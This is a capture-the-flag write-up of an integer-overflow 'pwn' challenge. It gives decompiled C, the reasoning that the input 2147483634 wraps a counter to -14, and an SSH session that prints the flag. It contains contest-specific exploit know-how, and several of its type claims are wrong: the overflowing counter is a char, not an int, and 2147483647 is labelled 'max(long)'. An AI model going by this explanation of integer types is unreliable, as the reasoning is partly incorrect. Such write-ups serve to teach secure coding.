## Integer Over
### Category : Pwn

We are given a binary.

We decompile the binary in Ghidra. Useful Function:

```

undefined8 main(void)

{
  long in_FS_OFFSET;
  char local_1d;
  int local_1c;
  int local_18;
  int local_14;
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  printf("Give me one param: ");
  fflush((FILE *)0x0);
  local_14 = __isoc99_scanf(&DAT_00400869,&local_1c);
  if (local_14 != 1) {
    puts("I expect a number.");
    fflush((FILE *)0x0);
  }
  local_1d = 0;
  local_18 = 0;
  while (local_18 < local_1c) {
    local_1d = local_1d + 1;
    local_18 = local_18 + 1;
  }
  if (local_1d == -0xe) {
    gimmeFlagPliz();
  }
  else {
    printf("No, I can\'t give you the flag: %d\n",(ulong)(uint)(int)local_1d);
    fflush((FILE *)0x0);
  }
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
}


```

The code asks for one parameter, which is a number. To get the flag, we need to call the ```gimmeFlagPliz()``` function, which can only be called if the iterator `local_18` (with `local_18` and `local_1d` being equivalent) is `-14` or `-0xe` and is of the `int` datatype. It is compared to the input parameter `local_1c` which is of the `long` datatype. 

So, after a while, the value will overflow into negative.

The following math help

```
max(long)+output=input
2147483647+-14=input=2147483634
```

SSH'ing into the server, we get the flag

```
ssh -i ssh.key  -p 2223 user@hell-of-a-jail.ctf.insecurity-insa.fr
 ___           _   _            _      ____   ___  _  ___
|_ _|_ __  ___| | | | __ _  ___| | __ |___ \ / _ \/ |/ _ \
| || '_ \/ __| |_| |/ _` |/ __| |/ /   __) | | | | | (_) |
| || | | \__ \  _  | (_| | (__|   <   / __/| |_| | |\__, |
|___|_| |_|___/_| |_|\__,_|\___|_|\_\ |_____|\___/|_|  /_/

===========================================================

      You are accessing a sandbox challenge over SSH
        This sandbox will be killed soon enough.
       Please wait while we launch your sandbox...

===========================================================

Give me one param: 2147483634
INSA{B3_v3rY_c4r3fUL_w1tH_uR_1nt3g3r_bR0}
Connection to hell-of-a-jail.ctf.insecurity-insa.fr closed.
```